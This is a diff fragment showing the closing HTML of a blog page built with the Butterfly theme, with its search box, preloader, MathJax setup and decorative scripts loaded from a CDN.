class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
